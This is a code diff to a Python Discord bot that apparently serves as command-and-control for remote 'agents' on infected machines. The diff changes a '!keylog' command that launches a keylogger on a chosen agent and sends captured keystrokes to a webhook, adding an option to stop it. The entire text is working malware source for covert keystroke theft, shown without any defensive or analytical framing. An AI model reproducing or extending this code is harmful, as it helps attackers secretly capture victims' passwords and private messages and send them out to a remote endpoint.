@@ -266,20 +266,29 @@ async def keylog(context):
     command = context.message.content.replace("!keylog ", "")
     word_list = command.split()
     if int(word_list[0]) == int(ID):
+        global stop_Keylogger
+        stop_Keylogger = False
+        if word_list[1] == "stop":
+            stop_Keylogger = True
+            my_embed = discord.Embed(title=f"Keylogger stopped on Agent#{ID}")
+            await context.message.channel.send(embed=my_embed)
         def keylogger_start():
             try:
+                if stop_Keylogger:
+                        return
                 interval = word_list[1]
                 keyloggerr = keylogger.Keylogger(interval=int(interval), ID=ID, webhook=KEYLOGGER_WEBHOOK, report_method="webhook")
                 keyloggerr.start()
             except IndexError:
                 my_embed = discord.Embed(title=f"Error while starting Keylogger on Agent#{ID}\nMake sure you have specified all the required parameters", color=0xFF0000)
-        try:
-            threading.Thread(target=keylogger_start).start()
-            my_embed = discord.Embed(title=f"Keylogger started on Agent#{ID}", color=0x00FF00)
-            await context.message.channel.send(embed=my_embed)
-        except Exception as e:
-            my_embed = discord.Embed(title=f"Error while starting keylogger on Agent#{ID}:\n{e}", color=0xFF0000)
-            await context.message.channel.send(embed=my_embed)
+        if not stop_Keylogger:
+            try:
+                threading.Thread(target=keylogger_start).start()
+                my_embed = discord.Embed(title=f"Keylogger started on Agent#{ID}", color=0x00FF00)
+                await context.message.channel.send(embed=my_embed)
+            except Exception as e:
+                my_embed = discord.Embed(title=f"Error while starting keylogger on Agent#{ID}:\n{e}", color=0xFF0000)
+                await context.message.channel.send(embed=my_embed)
     else:
         pass
 
